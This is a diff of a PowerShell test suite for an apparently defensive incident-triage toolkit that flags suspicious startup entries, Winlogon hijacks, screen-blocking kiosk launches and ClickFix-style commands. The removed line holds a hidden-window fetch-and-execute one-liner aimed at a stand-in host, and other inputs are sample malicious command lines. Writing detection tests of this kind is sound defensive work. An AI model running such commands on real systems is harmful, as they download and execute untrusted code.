@@ -77,7 +77,8 @@ $susp = @((Import-ToolkitConfig -ConfigDir (Join-Path $root 'config')).Watchlist
 Assert-Equal (Test-PatternMatch '%windir%\system32\rundll32.exe %windir%\system32\PcaSvc.dll,PcaPatchSdbTask' $susp) $false 'built-in rundll32 task not suspicious'
 Assert-Equal (Test-PatternMatch 'rundll32.exe C:\Users\bob\AppData\Roaming\x.dll,Start' $susp)                     $true  'rundll32 from user profile suspicious'
 Assert-Equal (Test-PatternMatch 'rundll32.exe payload.dll,#1' $susp)                                               $true  'rundll32 ordinal suspicious'
-Assert-Equal (Test-PatternMatch 'powershell -w hidden -c iwr http://x/a.ps1 | iex' $susp)                          $true  'ClickFix one-liner suspicious'
+# Kept in a data file: as a literal in this script it makes Windows' antimalware scan (AMSI) refuse to load the tests
+Assert-Equal (Test-PatternMatch (Get-Content (Join-Path $PSScriptRoot 'samples\clickfix-command.txt') -TotalCount 1) $susp) $true 'ClickFix one-liner suspicious'
 
 # 8. Cleanup scope
 Assert-Equal (Test-InScope 'ScreenConnect Client (1a2b)' @('1a2b'))       $true  'in scope'
@@ -131,5 +132,40 @@ $g = Get-ToolkitGate -Results @($tri, $dry) -Disconnected $false
 Assert-Equal $g.CleanupOpen $false 'gate: box not ticked blocks cleanup'
 $g = Get-ToolkitGate -Results @($tri, $dry) -Disconnected $true
 Assert-Equal $g.CleanupOpen $true 'gate: triage + dry run + offline opens cleanup'
+
+# 12. What a startup entry really runs
+Assert-Equal (Get-CommandTargetPath '"C:\Users\bob\AppData\Roaming\x y\a.exe" --min') 'C:\Users\bob\AppData\Roaming\x y\a.exe' 'target: quoted path with spaces'
+Assert-Equal (Get-CommandTargetPath 'C:\Program Files\App\app.exe -x') 'C:\Program Files\App\app.exe' 'target: unquoted path with spaces'
+Assert-Equal (Get-CommandTargetPath 'powershell.exe -File C:\Users\bob\AppData\up date.ps1') 'C:\Users\bob\AppData\up date.ps1' 'target: script handed to powershell'
+Assert-Equal (Get-CommandTargetPath 'C:\Windows\system32\rundll32.exe C:\ProgramData\x.dll,Run') 'C:\ProgramData\x.dll' 'target: DLL handed to rundll32'
+Assert-Equal (Get-CommandTargetPath 'C:\Windows\System32\cmd.exe /c echo hi') 'C:\Windows\System32\cmd.exe' 'target: inline command stays the host'
+Assert-Equal (Get-CommandTargetPath '') '' 'target: empty is safe'
+
+# 13. Startup rating
+$since = (Get-Date).AddDays(-14); $old = (Get-Date).AddDays(-200); $new = (Get-Date).AddDays(-1)
+$rate = { param($p, $c, $s) (Get-AutostartRating -Path $p -Created $c -SignatureStatus $s -Since $since).Severity }
+Assert-Equal (& $rate 'C:\Users\bob\AppData\Roaming\x\x.exe' $new 'NotSigned') 'Medium' 'rating: new unsigned in AppData'
+Assert-Equal (& $rate 'C:\Users\bob\AppData\Roaming\x\x.exe' $old 'NotSigned') 'Medium' 'rating: old unsigned in AppData'
+Assert-Equal (& $rate 'C:\Users\bob\AppData\Local\Discord\Update.exe' $old 'Valid') '' 'rating: old signed app is quiet'
+Assert-Equal (& $rate 'C:\Users\bob\AppData\Local\New\n.exe' $new 'Valid') 'Low' 'rating: new signed is shown, not alarming'
+Assert-Equal (& $rate 'C:\Program Files\Old\o.exe' $old 'NotSigned') '' 'rating: old unsigned in Program Files is quiet'
+Assert-Equal (& $rate 'C:\Windows\System32\svchost.exe' $new 'Valid') '' 'rating: Windows update of a signed file is quiet'
+Assert-Equal (& $rate 'C:\Windows\Temp\t.exe' $old 'NotSigned') 'Medium' 'rating: Windows\Temp is user-writable'
+
+# 14. Network triggers and logon takeover
+Assert-Equal (Test-NetworkEventTrigger '<Select Path="Microsoft-Windows-NetworkProfile/Operational">*[System[EventID=10000]]</Select>') $true 'network trigger: NetworkProfile event'
+Assert-Equal (Test-NetworkEventTrigger '<Select Path="Application">*</Select>') $false 'network trigger: other event'
+Assert-Equal (Test-WinlogonValue 'Shell' 'explorer.exe') $true 'winlogon: default shell ok'
+Assert-Equal (Test-WinlogonValue 'Shell' 'explorer.exe, other.exe') $false 'winlogon: extra shell flagged'
+Assert-Equal (Test-WinlogonValue 'Userinit' 'C:\Windows\system32\userinit.exe,') $true 'winlogon: default userinit ok'
+Assert-Equal (Test-WinlogonValue 'Userinit' 'userinit.exe,other.exe') $false 'winlogon: extra userinit flagged'
+
+# 15. Screen blockers and sensitive names
+$wl = (Import-ToolkitConfig -ConfigDir (Join-Path $root 'config')).Watchlist
+Assert-Equal (Test-PatternMatch '"C:\Program Files\Google\Chrome\Application\chrome.exe" --kiosk https://x.test/update' @($wl.screenBlockerPatterns)) $true 'blocker: chrome kiosk'
+Assert-Equal (Test-PatternMatch '"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default' @($wl.screenBlockerPatterns)) $false 'blocker: normal chrome'
+Assert-Equal (Test-PatternMatch 'chrome.exe --app-id=abcdef' @($wl.screenBlockerPatterns)) $false 'blocker: installed web app is not flagged'
+Assert-Equal (Test-PatternMatch 'Bank of X statement.pdf' @($wl.sensitiveFileNames)) $true 'sensitive: bank statement'
+Assert-Equal (Test-PatternMatch 'vacation photos' @($wl.sensitiveFileNames)) $false 'sensitive: ordinary name'
 
 if ($fail) { Write-Host "`n$fail test(s) failed" -ForegroundColor Red; exit 1 } else { Write-Host "`nAll tests passed" -ForegroundColor Green }
